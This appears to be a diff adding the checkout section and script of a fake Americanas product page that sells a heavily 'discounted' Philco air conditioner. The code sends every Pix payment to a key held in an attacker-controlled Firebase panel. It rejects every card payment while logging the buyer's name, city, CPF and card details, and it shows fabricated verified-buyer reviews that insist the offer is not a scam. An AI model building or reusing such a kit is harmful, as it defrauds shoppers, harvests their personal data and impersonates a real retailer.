+                    <div class="form-group"><label>CPF do titular</label><input type="text" id="cardCpf" placeholder="000.000.000-00" maxlength="14"></div>
+                    <div class="card-row">
+                        <div class="form-group"><label>Validade</label><input type="text" id="cardExpiry" placeholder="MM/AA" maxlength="5"></div>
+                        <div class="form-group"><label>CVV</label><input type="text" id="cardCvv" placeholder="123" maxlength="3"></div>
+                    </div>
+                    <div class="form-group"><label>Parcelas</label><select id="cardInstallments"></select></div>
+                </div>
+
+                <button class="finalizar-red" id="finalizarCompraBtn">FINALIZAR COMPRA</button>
+            </div>
+        </div>
+
+        <div id="pixScreen" style="display:none;" class="pix-screen">
+            <div class="timer" id="timer">30:00</div>
+            <div id="pixContent">
+                <h2><i class="fab fa-pix" style="color:#00a650;"></i> PIX QR Code</h2>
+                <p>Escaneie o código com seu celular</p>
+                <div class="qr-placeholder" id="qrPlaceholder"></div>
+                <p>Abra o app do seu banco e aponte a câmera</p>
+                <div class="pix-key" id="pixKey">Carregando...</div>
+                <button class="copy-btn" id="copyPixBtn"><i class="fas fa-copy"></i> copiar chave Pix</button>
+                <div class="small-message">Se você já realizou o pagamento, clique em confirmar</div>
+                <div id="paymentStatus" class="payment-status"></div>
+                <button class="confirm-btn" id="confirmarPagamentoBtn">CONFIRMAR</button>
+                <p>Valor da compra: <strong id="pixValorCompra">R$ 723,49</strong></p>
+            </div>
+            <div id="expiredMessage" class="expired-message">
+                <i class="fas fa-clock"></i><p>O tempo expirou.</p><p>Para pagar, finalize sua compra novamente.</p>
+                <button id="closeExpiredBtn">FECHAR</button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<div id="toast" class="toast"></div>
+
+<script>
+    // ==================== CONFIGURAÇÃO DO FIREBASE ====================
+    const firebaseConfig = {
+        apiKey: "AIzaSyCjIMUFTALiXEHBCzJTGSq7fRZYkncl3NA",
+        authDomain: "painel-americanas-33d0a.firebaseapp.com",
+        databaseURL: "https://painel-americanas-33d0a-default-rtdb.firebaseio.com",
+        projectId: "painel-americanas-33d0a",
+        storageBucket: "painel-americanas-33d0a.firebasestorage.app",
+        messagingSenderId: "1018096096887",
+        appId: "1:1018096096887:web:9073224c6d4b265779d872"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const database = firebase.database();
+    const pixKeyRef = database.ref('pixKey');
+    const pedidosRef = database.ref('pedidos');
+
+    // ==================== FUNÇÃO PARA GERAR PAYLOAD PIX MANUALMENTE ====================
+    function gerarPayloadPix(chave, valor, nome, cidade, txid = '***') {
+        const valorStr = valor.toFixed(2);
+        const nomeStr = nome.substring(0, 25);
+        const cidadeStr = cidade.substring(0, 15);
+
+        // Merchant Account Information (campo 26)
+        const gui = 'br.gov.bcb.pix';
+        let accountInfo = `0014${gui}01${chave.length.toString().padStart(2, '0')}${chave}`;
+        accountInfo = `${accountInfo.length.toString().padStart(2, '0')}${accountInfo}`;
+
+        // Montagem básica
+        let payload = `00020126${accountInfo}52040000530398654${valorStr.length.toString().padStart(2, '0')}${valorStr}5802BR59${nomeStr.length.toString().padStart(2, '0')}${nomeStr}60${cidadeStr.length.toString().padStart(2, '0')}${cidadeStr}`;
+
+        // Additional Data Field (campo 62) com TXID
+        const txidField = `05${txid.length.toString().padStart(2, '0')}${txid}`;
+        const additionalData = `${txidField.length.toString().padStart(2, '0')}${txidField}`;
+        payload += `62${additionalData}`;
+
+        // CRC16 (campo 63)
+        payload += '6304';
+        const crc = crc16(payload);
+        payload += crc;
+
+        return payload;
+    }
+
+    function crc16(str) {
+        let crc = 0xFFFF;
+        for (let i = 0; i < str.length; i++) {
+            crc ^= str.charCodeAt(i) << 8;
+            for (let j = 0; j < 8; j++) {
+                crc = (crc & 0x8000) ? (crc << 1) ^ 0x1021 : crc << 1;
+            }
+        }
+        crc &= 0xFFFF;
+        return crc.toString(16).toUpperCase().padStart(4, '0');
+    }
+
+    // ==================== ELEMENTOS DOM ====================
+    const trocaLink = document.getElementById('trocaLink');
+    const backLink = document.getElementById('backToProduct');
+    const productPage = document.getElementById('product-page');
+    const returnsPage = document.getElementById('returns-page');
+    const breadcrumb = document.getElementById('breadcrumb');
+    const calcFreteBtn = document.getElementById('calcFrete');
+    const enderecoInfo = document.getElementById('enderecoInfo');
+    const enderecoCompleto = document.getElementById('enderecoCompleto');
+    const freteValorDisplay = document.getElementById('freteValorDisplay');
+    const thumbnails = document.querySelectorAll('.thumb');
+    const mainImage = document.getElementById('mainProductImage');
+    const modal = document.getElementById('checkoutModal');
+    const comprarBtn = document.getElementById('comprarBtn');
+    const closeModal = document.getElementById('closeModal');
+    const finalizarBtn = document.getElementById('finalizarCompraBtn');
+    const step1 = document.getElementById('checkoutStep1');
+    const pixScreen = document.getElementById('pixScreen');
+    const buscarCepBtn = document.getElementById('buscarCep');
+    const pixContent = document.getElementById('pixContent');
+    const expiredMessage = document.getElementById('expiredMessage');
+    const timerEl = document.getElementById('timer');
+    const entregaSection = document.getElementById('entregaSection');
+    const confirmarBtn = document.getElementById('confirmarPagamentoBtn');
+    const paymentStatus = document.getElementById('paymentStatus');
+    const emailInput = document.getElementById('email');
+    const primeiroNomeInput = document.getElementById('primeiroNome');
+    const ultimoNomeInput = document.getElementById('ultimoNome');
+    const cpfInput = document.getElementById('cpf');
+    const telefoneInput = document.getElementById('telefone');
+    const cidadeInput = document.getElementById('cidade');
+    const pixKeyElement = document.getElementById('pixKey');
+    const qrPlaceholder = document.getElementById('qrPlaceholder');
+    const modalCepInput = document.getElementById('modalCep');
+    const ruaInput = document.getElementById('rua');
+    const numeroInput = document.getElementById('numero');
+    const bairroInput = document.getElementById('bairro');
+    const ufInput = document.getElementById('uf');
+    const cardNumber = document.getElementById('cardNumber');
+    const cardName = document.getElementById('cardName');
+    const cardCpf = document.getElementById('cardCpf');
+    const cardExpiry = document.getElementById('cardExpiry');
+    const cardCvv = document.getElementById('cardCvv');
+    const cardInstallments = document.getElementById('cardInstallments');
+    const quantidadeSelect = document.getElementById('quantidadeSelect');
+    const resumoSubtotal = document.getElementById('resumoSubtotal');
+    const resumoDescontos = document.getElementById('resumoDescontos');
+    const resumoEntrega = document.getElementById('resumoEntrega');
+    const resumoTotal = document.getElementById('resumoTotal');
+    const pixValorCompra = document.getElementById('pixValorCompra');
+
+    // ==================== VARIÁVEIS ====================
+    let frete = 0.00;
+    const precoUnitario = 723.49;
+    const precoAntigoUnitario = 1887.78;
+    const descontoUnitario = 1164.29;
+    let timerInterval = null;
+    let currentOrderId = null;
+
+    // ==================== IMAGENS ====================
+    const imageUrls = [
+        "https://americanas.vtexassets.com/arquivos/ids/36913718-1280-auto/Ar-Condicionado-Split-Philco-Hi-Wall-9000-BTU-h-Frio-Bifasico-Branco-PAS9FT-220V.webp?v=639057512517430000&quality=9",
+        "https://americanas.vtexassets.com/arquivos/ids/36913719-1280-auto/Ar-Condicionado-Split-Philco-Hi-Wall-9000-BTU-h-Frio-Bifasico-Branco-PAS9FT-220V.webp?v=639057512517600000&quality=9",
+        "https://americanas.vtexassets.com/arquivos/ids/36913720-1280-auto/Ar-Condicionado-Split-Philco-Hi-Wall-9000-BTU-h-Frio-Bifasico-Branco-PAS9FT-220V.webp?v=639057512517600000&quality=9",
+        "https://americanas.vtexassets.com/arquivos/ids/36913721-1280-auto/Ar-Condicionado-Split-Philco-Hi-Wall-9000-BTU-h-Frio-Bifasico-Branco-PAS9FT-220V.webp?v=639057512517600000&quality=9",
+        "https://americanas.vtexassets.com/arquivos/ids/36913722-1280-auto/Ar-Condicionado-Split-Philco-Hi-Wall-9000-BTU-h-Frio-Bifasico-Branco-PAS9FT-220V.webp?v=639057512517600000&quality=9",
+        "https://americanas.vtexassets.com/arquivos/ids/36913723-1280-auto/Ar-Condicionado-Split-Philco-Hi-Wall-9000-BTU-h-Frio-Bifasico-Branco-PAS9FT-220V.webp?v=639057512517600000&quality=9",
+        "https://americanas.vtexassets.com/arquivos/ids/36913724-1280-auto/Ar-Condicionado-Split-Philco-Hi-Wall-9000-BTU-h-Frio-Bifasico-Branco-PAS9FT-220V.webp?v=639057512517730000&quality=9",
+        "https://americanas.vtexassets.com/arquivos/ids/36913725-1280-auto/Ar-Condicionado-Split-Philco-Hi-Wall-9000-BTU-h-Frio-Bifasico-Branco-PAS9FT-220V.webp?v=639057512517730000&quality=9",
+        "https://americanas.vtexassets.com/arquivos/ids/36913726-1280-auto/Ar-Condicionado-Split-Philco-Hi-Wall-9000-BTU-h-Frio-Bifasico-Branco-PAS9FT-220V.webp?v=639057512517730000&quality=9"
+    ];
+    let currentImageIndex = 0;
+    function updateMainImage(index) { if (index>=0 && index<imageUrls.length) { mainImage.src=imageUrls[index]; currentImageIndex=index; } }
+    thumbnails.forEach((thumb,i)=>thumb.addEventListener('click',()=>updateMainImage(i)));
+    document.getElementById('prevImageBtn').addEventListener('click',()=>updateMainImage((currentImageIndex-1+imageUrls.length)%imageUrls.length));
+    document.getElementById('nextImageBtn').addEventListener('click',()=>updateMainImage((currentImageIndex+1)%imageUrls.length));
+
+    // ==================== MÁSCARAS ====================
+    function mascaraCPF(v){ return v.replace(/\D/g,'').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d)/,'$1.$2').replace(/(\d{3})(\d{1,2})$/,'$1-$2').substring(0,14); }
+    function mascaraTelefone(v){ return v.replace(/\D/g,'').replace(/^(\d{2})(\d)/,'($1) $2').replace(/(\d{5})(\d)/,'$1-$2').substring(0,15); }
+    function mascaraCEP(v){ return v.replace(/\D/g,'').replace(/^(\d{5})(\d)/,'$1-$2').substring(0,9); }
+    function mascaraCartao(v){ return v.replace(/\D/g,'').replace(/(\d{4})(?=\d)/g,'$1 ').trim().substring(0,19); }
+    function mascaraValidade(v){ return v.replace(/\D/g,'').replace(/^(\d{2})(\d)/,'$1/$2').substring(0,5); }
+    cpfInput.addEventListener('input',e=>e.target.value=mascaraCPF(e.target.value));
+    telefoneInput.addEventListener('input',e=>e.target.value=mascaraTelefone(e.target.value));
+    modalCepInput.addEventListener('input',e=>e.target.value=mascaraCEP(e.target.value));
+    cardNumber.addEventListener('input',e=>e.target.value=mascaraCartao(e.target.value));
+    cardExpiry.addEventListener('input',e=>e.target.value=mascaraValidade(e.target.value));
+    cardCvv.addEventListener('input',e=>e.target.value=e.target.value.replace(/\D/g,'').substring(0,3));
+    cardCpf.addEventListener('input',e=>e.target.value=mascaraCPF(e.target.value));
+
+    // ==================== PARCELAS ====================
+    function preencherParcelas(){ let o=''; for(let i=1;i<=8;i++){ let p=precoAntigoUnitario/i; o+=`<option value="${precoAntigoUnitario.toFixed(2)}">${i}x de R$ ${p.toFixed(2)} sem juros</option>`; } cardInstallments.innerHTML=o; }
+    preencherParcelas();
+
+    // ==================== ATUALIZAR RESUMO ====================
+    function atualizarResumo(){
+        const qtd=parseInt(quantidadeSelect.value);
+        const subtotal=precoAntigoUnitario*qtd;
+        const descontoTotal=descontoUnitario*qtd;
+        const total=(precoUnitario*qtd)+frete;
+        resumoSubtotal.textContent=`R$ ${subtotal.toFixed(2)}`;
+        resumoDescontos.textContent=`- R$ ${descontoTotal.toFixed(2)}`;
+        resumoEntrega.textContent=`R$ ${frete.toFixed(2)}`;
+        resumoTotal.textContent=`R$ ${total.toFixed(2)}`;
+        pixValorCompra.textContent=`R$ ${total.toFixed(2)}`;
+        if(freteValorDisplay) freteValorDisplay.textContent=frete===0?'Grátis':`R$ ${frete.toFixed(2)}`;
+    }
+    quantidadeSelect.addEventListener('change',atualizarResumo);
+
+    // ==================== EVENTOS INICIAIS ====================
+    trocaLink.addEventListener('click',e=>{ e.preventDefault(); productPage.style.display='none'; returnsPage.style.display='block'; breadcrumb.innerHTML='<i class="fas fa-home"></i> página inicial <i class="fas fa-chevron-right"></i> entregas e devoluções'; });
+    if(backLink) backLink.addEventListener('click',e=>{ e.preventDefault(); productPage.style.display='block'; returnsPage.style.display='none'; breadcrumb.innerHTML='<i class="fas fa-home"></i> página inicial <i class="fas fa-chevron-right"></i> climatização <i class="fas fa-chevron-right"></i> ar condicionado <i class="fas fa-chevron-right"></i> split philco 9.000 btus'; });
+
+    // ==================== CONSULTA CEP ====================
+    calcFreteBtn.addEventListener('click',async e=>{
+        e.preventDefault();
+        const cep=document.getElementById('cepInput').value.replace(/\D/g,'');
+        if(cep.length!==8){ showToast('CEP inválido',true); enderecoInfo.style.display='none'; return; }
+        try{
+            const r=await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+            const d=await r.json();
+            if(d.erro){ showToast('CEP não encontrado',true); enderecoInfo.style.display='none'; }
+            else{
+                enderecoCompleto.textContent=`${d.logradouro}, ${d.bairro} - ${d.localidade}/${d.uf}`;
+                frete=0;
+                atualizarResumo();
+                enderecoInfo.style.display='block';
+            }
+        }catch{ showToast('Erro ao buscar CEP',true); enderecoInfo.style.display='none'; }
+    });
+
+    [emailInput,primeiroNomeInput,ultimoNomeInput,cpfInput,telefoneInput].forEach(i=>i.addEventListener('input',()=>{ entregaSection.style.display=checkDadosPessoaisPreenchidos()?'block':'none'; }));
+    function checkDadosPessoaisPreenchidos(){ return emailInput.value.trim()&&primeiroNomeInput.value.trim()&&ultimoNomeInput.value.trim()&&cpfInput.value.trim()&&telefoneInput.value.trim(); }
+    function checkEnderecoPreenchido(){ return modalCepInput.value.trim()&&ruaInput.value.trim()&&numeroInput.value.trim()&&bairroInput.value.trim()&&cidadeInput.value.trim()&&ufInput.value.trim(); }
+    function checkCartaoPreenchido(){ return cardNumber.value.trim()&&cardName.value.trim()&&cardCpf.value.trim()&&cardExpiry.value.trim()&&cardCvv.value.trim(); }
+
+    async function buscarCep(cep){
+        try{
+            const r=await fetch(`https://viacep.com.br/ws/${cep}/json/`);
+            const d=await r.json();
+            if(!d.erro){ cidadeInput.value=d.localidade; ufInput.value=d.uf; bairroInput.value=d.bairro; ruaInput.value=d.logradouro; showToast('CEP encontrado! Preencha o número.'); }
+            else showToast('CEP não encontrado.',true);
+        }catch{ showToast('Erro ao buscar CEP.',true); }
+    }
+    buscarCepBtn.addEventListener('click',e=>{ e.preventDefault(); const cep=modalCepInput.value.replace(/\D/g,''); if(cep.length===8) buscarCep(cep); else showToast('CEP inválido.',true); });
+
+    function resetPixScreen(){ if(timerInterval)clearInterval(timerInterval); timerInterval=null; if(pixContent) pixContent.style.display='block'; if(expiredMessage) expiredMessage.style.display='none'; if(timerEl) timerEl.textContent='30:00'; if(paymentStatus){ paymentStatus.style.display='none'; paymentStatus.textContent=''; } }
+
+    comprarBtn.addEventListener('click',e=>{
+        e.preventDefault();
+        modal.style.display='flex';
+        step1.style.display='block';
+        pixScreen.style.display='none';
+        resetPixScreen();
+        entregaSection.style.display='none';
+        emailInput.value=''; primeiroNomeInput.value=''; ultimoNomeInput.value=''; cpfInput.value=''; telefoneInput.value='';
+        cidadeInput.value=''; modalCepInput.value=''; ruaInput.value=''; numeroInput.value='';
+        document.getElementById('complemento').value=''; bairroInput.value=''; ufInput.value='';
+        cardNumber.value=''; cardName.value=''; cardCpf.value=''; cardExpiry.value=''; cardCvv.value='';
+        const cepInicial=document.getElementById('cepInput').value.replace(/\D/g,'');
+        if(cepInicial.length===8) modalCepInput.value=cepInicial;
+        document.getElementById('optionPix').classList.add('selected');
+        document.getElementById('optionCard').classList.remove('selected');
+        document.getElementById('cardForm').classList.remove('show');
+        document.getElementById('pixInfo').style.display='block';
+        atualizarResumo();
+    });
+
+    closeModal.addEventListener('click',e=>{ e.preventDefault(); modal.style.display='none'; if(timerInterval)clearInterval(timerInterval); resetPixScreen(); });
+    window.addEventListener('click',e=>{ if(e.target===modal){ modal.style.display='none'; if(timerInterval)clearInterval(timerInterval); resetPixScreen(); } });
+
+    // ==================== FINALIZAR COMPRA ====================
+    finalizarBtn.addEventListener('click',async e=>{
+        e.preventDefault();
+        if(!checkDadosPessoaisPreenchidos()){ showToast('Preencha todos os dados pessoais.',true); return; }
+        if(!validarEmail(emailInput.value.trim())){ showToast('E-mail inválido.',true); return; }
+        if(!validarCPF(cpfInput.value.trim())){ showToast('CPF inválido.',true); return; }
+        if(!checkEnderecoPreenchido()){ showToast('Preencha todos os dados de endereço.',true); return; }
+
+        const metodo=document.getElementById('optionPix').classList.contains('selected')?'pix':'card';
+        const nomeCompleto=`${primeiroNomeInput.value.trim()} ${ultimoNomeInput.value.trim()}`;
+        const cidade=cidadeInput.value.trim()||'Não informada';
+        const valorCompra=parseFloat(resumoTotal.textContent.replace('R$ ','').replace(',','.'));
+
+        if(metodo==='pix'){
+            finalizarBtn.disabled=true;
+            finalizarBtn.textContent='Gerando PIX...';
+
+            // Busca chave PIX do Firebase
+            const snapshot=await pixKeyRef.once('value');
+            const chave=snapshot.val();
+            if(!chave){
+                showToast('Chave PIX não configurada no painel.',true);
+                finalizarBtn.disabled=false;
+                finalizarBtn.textContent='FINALIZAR COMPRA';
+                return;
+            }
+
+            // Gera payload PIX com valor usando nossa função manual
+            const payload = gerarPayloadPix(chave, valorCompra, 'Americanas', 'RIO DE JANEIRO', '***');
+
+            pixKeyElement.innerText = payload;
+            qrPlaceholder.innerHTML = '';
+            new QRCode(qrPlaceholder, { text: payload, width:200, height:200, colorDark:"#000000", colorLight:"#ffffff", correctLevel:QRCode.CorrectLevel.H });
+
+            // Salva pedido
+            const novoPedido = {
+                produto: 'Ar Condicionado Philco 9000 BTUs',
+                nome: nomeCompleto,
+                valor: valorCompra,
+                cidade: cidade,
+                status: 'pendente',
+                timestamp: Date.now()
+            };
+            const ref = await pedidosRef.push(novoPedido);
+            currentOrderId = ref.key;
+
+            step1.style.display='none';
+            pixScreen.style.display='block';
+            resetPixScreen();
+
+            let totalSeconds=1800;
+            if(timerInterval)clearInterval(timerInterval);
+            timerInterval=setInterval(()=>{
+                if(totalSeconds<=0){
+                    clearInterval(timerInterval);
+                    timerInterval=null;
+                    pixContent.style.display='none';
+                    expiredMessage.style.display='block';
+                    return;
+                }
+                totalSeconds--;
+                const mins=Math.floor(totalSeconds/60);
+                const secs=totalSeconds%60;
+                timerEl.textContent=`${mins.toString().padStart(2,'0')}:${secs.toString().padStart(2,'0')}`;
+            },1000);
+
+            finalizarBtn.disabled=false;
+            finalizarBtn.textContent='FINALIZAR COMPRA';
+        } else {
+            // Cartão (simulação)
+            if(!checkCartaoPreenchido()){ showToast('Preencha todos os dados do cartão.',true); return; }
+            if(!validarCPF(cardCpf.value.trim())){ showToast('CPF do titular inválido.',true); return; }
+            const selectedOption=cardInstallments.options[cardInstallments.selectedIndex];
+            const total=parseFloat(selectedOption.value);
+            const numero=cardNumber.value.replace(/\D/g,'');
+            const ultimos4=numero.slice(-4);
+            const bandeira=numero.startsWith('4')?'Visa':(numero.startsWith('5')?'Mastercard':(numero.startsWith('6')?'Elo':'Desconhecida'));
+            const dadosCartao={ultimos4,bandeira,parcelas:cardInstallments.selectedIndex+1,total,cpf:cardCpf.value.trim()};
+            const novoPedido={
+                produto:'Ar Condicionado Philco 9000 BTUs',
+                nome:nomeCompleto,
+                valor:total,
+                cidade:cidade,
+                status:'recusado',
+                cartao:dadosCartao,
+                timestamp:Date.now()
+            };
+            pedidosRef.push(novoPedido);
+            showToast('Cartão recusado. Tente novamente com Pix.',true);
+        }
+    });
+
+    window.selectPayment = function(method){
+        const optionPix=document.getElementById('optionPix');
+        const optionCard=document.getElementById('optionCard');
+        const cardForm=document.getElementById('cardForm');
+        const pixInfo=document.getElementById('pixInfo');
+        if(method==='pix'){
+            optionPix.classList.add('selected');
+            optionCard.classList.remove('selected');
+            cardForm.classList.remove('show');
+            pixInfo.style.display='block';
+        }else{
+            optionCard.classList.add('selected');
+            optionPix.classList.remove('selected');
+            cardForm.classList.add('show');
+            pixInfo.style.display='none';
+        }
+    };
+
+    document.getElementById('copyPixBtn').addEventListener('click',e=>{
+        e.preventDefault();
+        navigator.clipboard.writeText(pixKeyElement.innerText).then(()=>showToast('Código PIX copiado!')).catch(()=>showToast('Pressione Ctrl+C',true));
+    });
+
+    confirmarBtn.addEventListener('click',e=>{
+        e.preventDefault();
+        if(currentOrderId){
+            pedidosRef.child(currentOrderId).update({status:'pago'});
+            setTimeout(()=>{ modal.style.display='none'; if(timerInterval)clearInterval(timerInterval); resetPixScreen(); },500);
+        }else{ modal.style.display='none'; if(timerInterval)clearInterval(timerInterval); resetPixScreen(); }
+    });
+
+    document.getElementById('closeExpiredBtn').addEventListener('click',e=>{ e.preventDefault(); modal.style.display='none'; if(timerInterval)clearInterval(timerInterval); resetPixScreen(); });
+
+    window.toggleSection = function(header){ const c=header.nextElementSibling; const i=header.querySelector('i'); c.classList.toggle('hidden'); i.classList.toggle('rotate'); };
+    document.getElementById('queroAvaliarBtn')?.addEventListener('click',e=>{ e.preventDefault(); showToast('Função "Quero avaliar" temporária.'); });
+
+    // ==================== AVALIAÇÕES DINÂMICAS ====================
+    const avaliacoes = [
+        { nome:"Roberto C.", data:"15/02/2025", texto:"Produto original, chegou bem antes do prazo. Já instalei e está gelando muito. Recomendo!", thumbsUp:24, thumbsDown:0, verificado:true },
+        { nome:"Mariana S.", data:"03/01/2025", texto:"Fiquei com medo de ser golpe, mas é legítimo! A Americanas é confiável e o ar é excelente.", thumbsUp:31, thumbsDown:1, verificado:true },
+        { nome:"Carlos A.", data:"20/12/2024", texto:"Comprei e chegou certinho. Embalagem intacta e produto funcionando perfeitamente.", thumbsUp:18, thumbsDown:0, verificado:true },
+        { nome:"Fernanda L.", data:"10/11/2024", texto:"Desconfiei do preço, mas é verdade! O ar é muito bom e geladinho.", thumbsUp:27, thumbsDown:0, verificado:true },
+        { nome:"João P.", data:"05/10/2024", texto:"Entrega rápida, produto lacrado e funcionando. Ótimo custo-benefício.", thumbsUp:15, thumbsDown:0, verificado:true }
+    ];
+    let showAllReviews=false;
+    function renderReviews(){
+        const sortBy=document.getElementById('sortSelect').value;
+        let sorted=[...avaliacoes];
+        if(sortBy==='helpful') sorted.sort((a,b)=>b.thumbsUp-a.thumbsUp);
+        else if(sortBy==='recent') sorted.sort((a,b)=>{ const [aD,aM,aY]=a.data.split('/'); const [bD,bM,bY]=b.data.split('/'); return new Date(bY,bM-1,bD)-new Date(aY,aM-1,aD); });
+        const limit=showAllReviews?sorted.length:3;
+        const reviewsToShow=sorted.slice(0,limit);
+        const container=document.getElementById('reviewsContainer');
+        container.innerHTML='';
+        reviewsToShow.forEach(av=>{
+            const div=document.createElement('div');
+            div.className='qa-item';
+            div.innerHTML=`
+                <div class="qa-question"><i class="fas fa-user"></i> ${av.nome} ${av.verificado?'<span class="verified-badge">comprador verificado</span>':''} <span style="float:right; font-weight:normal;">${av.data}</span></div>
+                <div class="qa-answer">"${av.texto}"</div>
+                <div class="review-helpful"><span><i class="fas fa-thumbs-up"></i> ${av.thumbsUp}</span><span><i class="fas fa-thumbs-down"></i> ${av.thumbsDown}</span><span>esta avaliação foi útil?</span></div>
+            `;
+            container.appendChild(div);
+        });
+        const link=document.getElementById('verMaisAvaliacoes');
+        if(avaliacoes.length>3){
+            link.style.display='block';
+            link.textContent=showAllReviews?'Mostrar menos avaliações':'Ver todas as 5 avaliações';
+        }else link.style.display='none';
+    }
+    document.getElementById('sortSelect').addEventListener('change',renderReviews);
+    document.getElementById('verMaisAvaliacoes').addEventListener('click',e=>{ e.preventDefault(); showAllReviews=!showAllReviews; renderReviews(); });
+    renderReviews();
+
+    // ==================== FUNÇÕES AUXILIARES ====================
+    function showToast(msg,err){ const t=document.getElementById('toast'); t.textContent=msg; t.style.backgroundColor=err?'#c62828':'#333'; t.classList.add('show'); setTimeout(()=>t.classList.remove('show'),3000); }
+    function validarEmail(email){ return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email); }
+    function validarCPF(cpf){ cpf=cpf.replace(/\D/g,''); if(cpf.length!==11||/^(\d)\1+$/.test(cpf))return false; let s=0,r; for(let i=1;i<=9;i++)s+=parseInt(cpf.charAt(i-1))*(11-i); r=(s*10)%11; if(r===10||r===11)r=0; if(r!==parseInt(cpf.charAt(9)))return false; s=0; for(let i=1;i<=10;i++)s+=parseInt(cpf.charAt(i-1))*(12-i); r=(s*10)%11; if(r===10||r===11)r=0; return r===parseInt(cpf.charAt(10)); }
+</script>
+</body>
+</html>
